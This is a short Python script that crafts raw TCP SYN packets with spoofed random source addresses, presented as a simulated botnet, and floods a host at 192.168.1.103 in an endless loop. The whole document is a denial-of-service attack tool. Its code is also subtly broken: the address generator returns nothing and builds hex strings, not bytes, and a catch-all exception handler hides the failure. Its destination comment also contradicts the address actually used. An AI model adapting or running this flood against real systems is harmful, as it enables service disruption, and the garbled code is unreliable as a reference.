import socket
import random

def rip ():	# generating a random IP address '192.168.1.X'

	octet1 = str(hex(192))
	octet2 = str(hex(168))
	octet3 = str(hex(1))
	octet4 = str(hex(random.randint(1,254)))

	ip = octet1+octet2+octet3+octet4


number = 0
while True:

	try:
		tmp = rip()	# simulating a zombie system
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

		ip_header  = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
		ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
		ip_header += b'\x40\x06\xa6\xec'  # TTL, Protocol | Header Checksum
		ip_header += tmp  # Source Address (random IP addresses representing a botnet)
		ip_header += b'\xC0\xA8\x01\x67'  # Destination Address 192.168.1.113

		tcp_header  = b'\x30\x3B\x30\x3B' # Source Port | Destination Port
		tcp_header += b'\x00\x00\x00\x00' # Sequence Number
		tcp_header += b'\x00\x00\x00\x00' # Acknowledgement Number
		tcp_header += b'\x50\x02\x71\x10' # Data Offset, Reserved, Flags | Window Size /SYN set to 1
		tcp_header += b'\xe6\x32\x00\x00' # Checksum | Urgent Pointer

		packet = ip_header + tcp_header
		s.sendto(packet, ('192.168.1.103', 12347))
		number += 1
		print(f'sent packet from {tmp} ' + str(number))
	except Exception:
		pass
